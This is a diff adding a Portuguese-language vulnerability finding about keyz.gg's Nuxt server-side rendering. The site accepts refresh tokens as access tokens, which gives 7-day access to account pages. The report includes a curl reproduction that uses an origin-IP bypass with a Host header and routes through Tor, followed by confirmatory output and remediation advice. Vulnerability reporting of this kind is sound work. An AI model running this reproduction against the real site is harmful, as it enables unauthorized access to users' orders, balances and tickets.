@@ -1,0 +1,99 @@
+# F-W6 — Nuxt SSR auth via refresh_token cookie (F-W1 type confusion extends to SSR)
+
+## Data: 2026-09-05T00:25Z
+## Host: keyz.gg (via origin bypass 104.238.205.118 + Host header)
+## Severidade: Alta
+## CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+
+## Descrição
+
+O app Nuxt (keyz.gg) usa cookies `auth.access_token` e `auth.refresh_token`
+para autenticação SSR. Descobrimos que o SSR aceita o **refresh token** (exp 7d)
+no cookie `auth.access_token` — confirmando que a JWT token type confusion (F-W1)
+se estende à camada SSR. Um atacante com apenas o refresh token consegue acessar
+TODAS as páginas autenticadas do Nuxt (`/conta/*`) por 7 dias, sem precisar do
+access token (exp 1h).
+
+## Descoberta
+
+1. `/conta/pedidos` retorna 302→`/` (redirect) sem cookie.
+2. `/conta/pedidos` com cookie `auth.access_token=<JWT>` retorna 401:
+   `[GET] "https://api.keyz.gg/me": 401 Unauthorized` (SSR chama /me mas
+   API rejeita cookie, só aceita Bearer).
+3. `/conta/pedidos` com cookie `auth.access_token=<JWT>; auth.refresh_token=<JWT>`
+   retorna **200** (366KB HTML) — SSR autenticado!
+4. Testado 3 combinações — TODAS retornam 200:
+   - `auth.access_token=ACCESS; auth.refresh_token=ACCESS` → 200
+   - `auth.access_token=REFRESH; auth.refresh_token=REFRESH` → 200 (type confusion!)
+   - `auth.access_token=ACCESS; auth.refresh_token=REFRESH` → 200
+
+## Reprodução
+
+```bash
+ACCESS=$(cat recon/active/.test_token)      # exp 1h
+REFRESH=$(cat recon/active/.test_refresh)    # exp 7d
+
+# SSR auth com refresh token como access_token (F-W1 extends to SSR):
+curl -sk --proxy socks5://127.0.0.1:9050 -H "Host: keyz.gg" \
+  -H "Cookie: auth.access_token=$REFRESH; auth.refresh_token=$REFRESH" \
+  -o /tmp/ssr_pedidos.html -w "%{http_code}\n" \
+  "https://104.238.205.118/conta/pedidos"
+# → 200 (364993B)
+```
+
+## Output confirmatório
+
+```
+/conta/pedidos WITH auth.access_token + auth.refresh_token (both access):
+HTTP 200 (364993B)
+
+/conta/pedidos WITH auth.access_token=refresh + auth.refresh_token=refresh (F-W1 type confusion):
+HTTP 200 (364993B)
+
+/conta/pedidos WITH auth.access_token=access + auth.refresh_token=refresh (correct combo):
+HTTP 200 (364993B)
+```
+
+## Cookie names (descobertos no JS bundle /d/BSXZiTg4.js)
+
+```
+li("auth.access_token",n)        # cookie de access token
+li("auth.refresh_token",n)       # cookie de refresh token
+li("auth.access_token_expiration",n)
+li("auth.refresh_token_expiration",n)
+```
+
+## Rotas autenticadas SSR confirmadas (200 com cookie)
+
+```
+/conta                → 200 (704845B) "Minha Conta"
+/conta/pedidos        → 200 (364993B) "Pedidos"
+/conta/tickets        → 200 (367648B) "Tickets"
+/conta/saldo/extrato  → 200 (376645B) "Extrato de Saldo"
+/conta/cashback/extrato → 200 (373895B) "Extrato de Cashback"
+```
+
+## Impacto
+
+- Atacante com refresh token (7d) mantém acesso SSR a TODAS as páginas /conta/*
+- Combinado com F-W1 (refresh aceito como access na API), o foothold persiste
+  7 dias sem renovar
+- O refresh token é mais valioso que o access token para SSR (janela 7d vs 1h)
+- Páginas SSR expõem Nuxt payload com cache de API calls (produtos, categorias,
+  orders) — possivelmente dados sensíveis no __NUXT_DATA__
+
+## Recomendação
+
+1. O Nuxt SSR deve validar o tipo do token (access vs refresh) — rejeitar
+   refresh no cookie `auth.access_token`.
+2. Implementar rotação de refresh tokens (o mesmo secret assina ambos = F-W1).
+3. Usar secrets DIFERENTES para access e refresh tokens (resolve F-W1 + F-W6).
+4. Considerar HttpOnly + SameSite=Strict nos cookies de auth.
+
+## Notas
+
+- A descoberta inicial de que o SSR chama `api.keyz.gg/me` (via Nuxt $fetch)
+  e rejeita cookies foi o ponto de partida.
+- O SSR Nuxt usa o padrão `useCookie("auth.access_token")` para leitura.
+- O bug é que o SSR não valida se o cookie é access ou refresh — apenas
+  repassa para a API, que (F-W1) aceita ambos.
